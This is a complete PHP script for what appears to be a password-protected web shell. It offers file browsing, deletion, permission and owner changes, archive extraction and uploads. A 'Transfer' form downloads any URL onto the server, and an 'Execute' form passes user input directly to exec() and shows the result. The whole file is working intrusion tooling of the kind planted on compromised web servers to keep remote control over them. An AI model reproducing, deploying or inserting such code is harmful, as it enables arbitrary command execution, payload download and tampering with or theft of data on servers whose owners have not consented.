<?php
session_start();
?>
<!DOCTYPEhtml>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<title><?php echo $_SERVER['SERVER_NAME']; ?></title>
<style>
*{padding:0;margin:0;}
body{color:#000;font-family:"Tahoma";font-size:11px;}
a{color:#3780b3;text-decoration:none;}
a:hover{color:#000;}
.head{background-color:#6ca607;color:#fff;text-align:center;letter-spacing:1px;}
.head:hover{background-color:#FE4902;}
td{background-color:#F3F3F3;padding:2px 5px;margin:0;border-bottom:1px solid rgba(0,0,0,.05);border-right:1px solid rgba(0,0,0,.05);}
tr:hover td{background-color:#ddd;}
</style>
</head>
<body>
<?php
$pass = 'c3707ff0dac091aade4865d779fa25814e248ad4';
$base = basename(__FILE__);
$dir = dirname(__FILE__);
if(isset($_GET['logout']))
	unset($_SESSION['user']);
if((isset($_POST['password'])) && (SHA1($_POST['password']) == $pass))
	$_SESSION['user']=SHA1($pass);
elseif(isset($_POST['password']))
	echo '<center>Wrong Pass!!!</center>';
if(!isset($_SESSION['user']) || $_SESSION['user'] != SHA1($pass))
{
?>
<center>
<form method="post" action="<?php echo $base; ?>" style="margin-top:20%;">
<input type="password" name="password" placeholder="Password"/>
<input type="submit" name="login" value="Login" />
</form>
</center>
<?php
}
elseif(isset($_SESSION['user']) and $_SESSION['user'] == SHA1($pass))
{
?>
<center>
<a href="?logout=logout" target="_self">Logout</a><br/><br/>
<?php
function frmtindex($f)
{
	$n=explode(".",$f);
	$exts=strtolower(end($n));
	return $exts;
}
if(isset($_POST['directory']))
	$addres=$_POST['directory'];
else
	$addres=$dir;
if(isset($_POST['delete']))
{
	if(!is_dir($_POST['file']))
	{
		if(unlink($_POST['file']))
			echo "successfully deleted<br/>";
		else
			echo "wrong delete<br/>";
	}
	else
	{
		if(rmdir($_POST['file']))
			echo "successfully deleted<br/>";
		else
			echo "wrong delete<br/>";
	}
}
if(isset($_POST['copy']))
{
	if(copy($_POST['file'],$_POST['dest']))
		echo "successfully copied<br/>";
	else
		echo "wrong copy<br/>";
}
if(isset($_POST['rename']))
{
	if(rename($_POST['oldname'],$_POST['newname']))
		echo "successfully renamed<br/>";
	else
		echo "wrong rename<br/>";
}
if(isset($_POST['get']))
{
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, trim($_POST['file']));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $sourcecode = curl_exec($ch);
    curl_close($ch);
}
if(isset($_POST['unzip']))
{
	$zip = new ZipArchive;
	if($zip->open($_POST['file']) === TRUE)
	{
		$zip->extractTo($_POST['dest']);
		$zip->close();
		echo 'unzip done';
	}
	else
		echo 'unzip failed';
}
if(isset($_POST['unrar']))
{

}
if(isset($_POST['untar']))
{
	$p = new PharData($_POST['file']);
	$p->decompress();
	$phar = new PharData($_POST['file']);
	$phar->extractTo($_POST['dest']); 
}
if(isset($_POST['chown']))
{
	if(chown($_POST['file'],$_POST['cho']))
		echo "successfully owner changed!!!";
	else
		echo "could not be change owner!!!";
}
if(isset($_POST['chgrp']))
{
	if(chgrp($_POST['file'],$_POST['chg']))
		echo "successfully group changed!!!";
	else
		echo "could not be change group!!!";
}
if(isset($_POST['chmod']))
{
	if(chmod($_POST['file'],$_POST['chm']))
		echo "successfully mode changed!!!";
	else
		echo "could not be change mode!!!";
}
if(isset($_POST['mkdir']))
{
	if(mkdir($addres.DIRECTORY_SEPARATOR.$_POST['fdname'],0755))
		echo "successfully directory created!!!";
	else
		echo "could not be create directory!!!";
}
if(isset($_POST['fopen']))
{
	if(fopen($addres.DIRECTORY_SEPARATOR.$_POST['fdname'],"wb"))
		echo "successfully file created!!!";
	else
		echo "could not be create file!!!";
}
if(isset($_POST['transfer']))
{
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, trim($_POST['file']));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);

	@mkdir($_POST['dest'],0755);
	$fp = fopen($_POST['dest'].basename($_POST['file']), "wb");
	if(!$fp)
		echo 'Error! Check URL and Directory';
	else
		echo 'Tranfer Done';
	fwrite($fp,$content);
	fclose($fp);
}
if(isset($_POST['upload']))
{
	if($_FILES["file"]["error"]>0)
		echo "Return Errors: ".$_FILES["file"]["error"]."<br/>";
	else
	{
		if(file_exists($addres.DIRECTORY_SEPARATOR.$_FILES["file"]["name"]))
			unlink($addres.DIRECTORY_SEPARATOR.$_FILES["file"]["name"]);
		if(move_uploaded_file($_FILES["file"]["tmp_name"],$addres.DIRECTORY_SEPARATOR.$_FILES["file"]["name"]))
		{
			echo "Upload Done<br/>";
			echo 'Name: '.$_FILES["file"]["name"].
			'<br/>Type: '.$_FILES["file"]["type"].
			'<br/>Size: '.$_FILES["file"]["size"].
			' Byets<br/>TMP Address: '.$_FILES["file"]["tmp_name"];
		}
	}
}
if(isset($_POST['exec'])) {
    $exec = exec ("$_POST[command]");
}
$myDirectory = opendir($addres);
while($entryName = readdir($myDirectory))
	$dirArray[] = $entryName;
closedir($myDirectory);
$indexCount = count($dirArray);
sort($dirArray);
?>
<form action="<?php echo $base; ?>" method="post">
<input type="text" value="<?php echo $addres; ?>" name="directory" size="100%"/>
<input type="Submit" name="diradd" value="Go"/>
</form>
<br/>
</center>
<table width="100%" cellspacing="0">
<tr>
<td class="head">File (<?php echo $indexCount-2; ?>)</td>
<td class="head">Type</td>
<td class="head">Size</td>
<td class="head">Mod Time</td>
<td class="head">Get</td>
<td class="head">Owner</td>
<td class="head">Group</td>
<td class="head">Perms</td>
<td class="head">Delete</td>
<td class="head">Rename</td>
<td class="head">Copy</td>
</tr>
<tr>
<td>
<form action='<?php echo $base; ?>' method='post'>
<?php
$a = explode(DIRECTORY_SEPARATOR,$addres);
for($i = 0; $i <= count($a)-3; $i++)
	@$b .= $a[$i].DIRECTORY_SEPARATOR;
@$b .= $a[count($a)-2];
?>
<input type='hidden' value='<?php if(isset($b)){echo $b;} ?>' name='directory'/>
<input type='Submit' name='diradd' value='⇐ Up' style="border:none;background:transparent;color:blue;cursor:pointer"/>
</form>
</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<?php
for($index = 2; $index < $indexCount; $index++)
{
?>
<tr>
<td>
<?php
if(is_file($dirArray[$index]))
{
?>
<input type="checkbox" name="files" value="<?php echo $dirArray[$index] ?>"/>
<a target='_blank' title="<?php echo $dirArray[$index]; ?>" href='<?php echo $dirArray[$index]; ?>'>→ <?php if(strlen($dirArray[$index])>20){echo substr($dirArray[$index],0,20)."...";}else{echo $dirArray[$index];} ?></a>
<?php
}
else
{
?>
<form action='<?php echo $base; ?>' method='post'>
<input type='hidden' value='<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>' name='directory'/>
<input type="checkbox" name="files" value="<?php echo $dirArray[$index] ?>" disabled />
<input type='Submit' title="<?php echo $dirArray[$index]; ?>" name='diradd' value='⇒ <?php if(strlen($dirArray[$index])>20){echo substr($dirArray[$index],0,20)."...";}else{echo $dirArray[$index];} ?>' style="border:none;background:transparent;color:blue;cursor:pointer"/>
 <a target='_blank' href='<?php echo $dirArray[$index]; ?>'>↵</a>
</form>
<?php
}
if(strtolower(frmtindex($dirArray[$index]))=='zip')
{
?>
<form action='<?php echo $base; ?>' method='post'>
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type='hidden' value='<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>' name='file'/>
<input type='text' size="10" value='<?php echo $addres.DIRECTORY_SEPARATOR; ?>' name='dest'/>
<input type='submit' name='unzip' value='Unzip'>
</form>
<?php
}
if(strtolower(frmtindex($dirArray[$index]))=='rar')
{
?>
<form action='<?php echo $base; ?>' method='post'>
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type='hidden' value='<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>' name='file'/>
<input type='text' size="10" value='<?php echo $addres.DIRECTORY_SEPARATOR; ?>' name='dest'/>
<input type='submit' name='unrar' value='Unrar'>
</form>
<?php
}
if(strtolower(frmtindex($dirArray[$index]))=='gz')
{
?>
<form action='<?php echo $base; ?>' method='post'>
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type='hidden' value='<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>' name='file'/>
<input type='text' size="10" value='<?php echo $addres.DIRECTORY_SEPARATOR; ?>' name='dest'/>
<input type='submit' name='untar' value='Untar'>
</form>
<?php
}
?>
</td>
<td>
<?php
if(is_file($dirArray[$index]))
	echo frmtindex($dirArray[$index]);
else
	echo @filetype($dirArray[$index]);
?>
</td>
<td title="<?php if(is_file($dirArray[$index])){echo filesize($dirArray[$index]).' Byets';} ?>">
<?php
if(is_file($dirArray[$index]))
{
	if(filesize($dirArray[$index]) <= 1024)
		echo round(filesize($dirArray[$index]),2).' Bytes';
	else
	{
		if(filesize($dirArray[$index]) <= 1048576)
			echo round(filesize($dirArray[$index])/1024,2).' KB';
		else
		{
			if(filesize($dirArray[$index]) <= 1073741824)
				echo round(filesize($dirArray[$index])/1048576,2).' MB';
			else
			{
				if(filesize($dirArray[$index]) <= 1099511627776)
					echo round(filesize($dirArray[$index])/1073741824,2).' GB';
				else
					echo round(filesize($dirArray[$index])/1125899906842624,2).' TB';
			}
		}
	}
}
else
	echo "---";
?>
</td>
<td><center><?php echo @date("d/m/Y h:i:s",fileatime($dirArray[$index]));?></center></td>
<td>
<form action='<?php echo $base; ?>' method='post'>
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type='hidden' value='<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>' name='file'/>
<input type="submit" value="get" name="get"/>
</form>
</td>
<td>
<center>
<form action="<?php echo $base; ?>" method="post">
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type="hidden" value="<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>" name="file"/>
<input name="cho" type="text" size="1" value="<?php echo @fileowner($dirArray[$index]); ?>"/>
<input type="submit" name="chown" value="Ch"/>
</form>
</center>
</td>
<td>
<center>
<form action="<?php echo $base; ?>" method="post">
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type="hidden" value="<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>" name="file"/>
<input name="chg" type="text" size="1" value="<?php echo @filegroup($dirArray[$index]); ?>"/>
<input type="submit" name="chgrp" value="Ch"/>
</form>
</center>
</td>
<td><?php
$perms = @fileperms($dirArray[$index]);
if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
?>
<center>
<form action="<?php echo $base; ?>" method="post">
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type="hidden" value="<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>" name="file"/>
<input name="chm" type="text" size="1" title="<?php echo $info." <-- ".@substr(sprintf('%o',fileperms($dirArray[$index])),-4); ?>" value="<?php echo @fileperms($dirArray[$index]); ?>"/>
<input type="submit" name="chmod" value="Ch"/>
</form>
</center>
</td>
<td>
<center>
<form action="<?php echo $base; ?>" method="post">
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type="hidden" value="<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>" name="file"/>
<input type="submit" name="delete" value="Delete"/>
</form>
</center>
</td>
<td>
<center>
<form action='<?php echo $base; ?>' method='post'>
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type='hidden' value='<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>' name='oldname'/>
<input type='text' value='<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>' name='newname' size="3"/>
<input type='submit' name='rename' value='Rename'>
</form>
</center>
</td>
<td>
<center>
<form action='<?php echo $base; ?>' method='post'>
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type='hidden' value='<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>' name='file'/>
<input type='text' value='<?php echo $addres.DIRECTORY_SEPARATOR.$dirArray[$index]; ?>' name='dest' size="3"/>
<input type='submit' name='copy' value='Copy'/>
</form>
</center>
</td>
</tr>
<?php
}
?>
<tr>
<td>
<form action='<?php echo $base; ?>' method='post'>
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input type='text' placeholder="Create" name='fdname' size="10"/>
<input type='submit' name='mkdir' value="Dir"/>
<input type='submit' name='fopen' value="File"/>
</form>
</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</table>
<div class="head">
<?php
echo "Capacity: ".substr(@disk_total_space($addres)/1073741824,0,5) ." GB - ";
echo "Free Space: ".substr(@disk_free_space($addres)/1073741824,0,5) ." GB - ";
echo "Used Space: ".substr((@disk_total_space($addres) - @disk_free_space($addres))/1073741824,0,5) ." GB";
?>
</div><br/>
<center>
<form method="post" action="<?php echo $base; ?>" style="float:left;width:24%">
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input name="file" type="text" value="<?php if(isset($_POST['file'])){echo $_POST['file'];}else{echo "http://";} ?>"/><br/>
<input name="dest" type="text" value="<?php if(isset($_POST['dest'])){echo $_POST['dest'];}else{echo "$addres".DIRECTORY_SEPARATOR;} ?>"/><br/>
<input name="transfer" type="submit" value="Transfer" /><br/>
</form>
<form method="post" action="<?php echo $base; ?>" enctype="multipart/form-data" style="float:left;width:24%">
<input type='hidden' value='<?php echo $addres; ?>' name='directory'/>
<input name="file" type="file"/><br/>
<input name="upload" type="submit" value="Upload"/><br/>
</form>
    <form method="post" action="<?php echo $base; ?>" enctype="multipart/form-data" style="float:left;width:24%">
        <input type='text' name='command'/><br/>
        <input name="exec" type="submit" value="Execute"/><br/>
        <?php
        if (isset($exec)){
            echo $exec.'<br/>';
        }
        ?>
    </form>
    <form method="post" action="<?php echo $base; ?>" enctype="multipart/form-data" style="float:left;width:24%">
    <textarea width="100%" heght="100px">
<?php
if (isset($sourcecode)){
    echo $sourcecode;
}
?>
    </textarea>
    </form>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
</center>
<?php
}
else
{
?>
:)
<?php
}
?>
</body>
</html>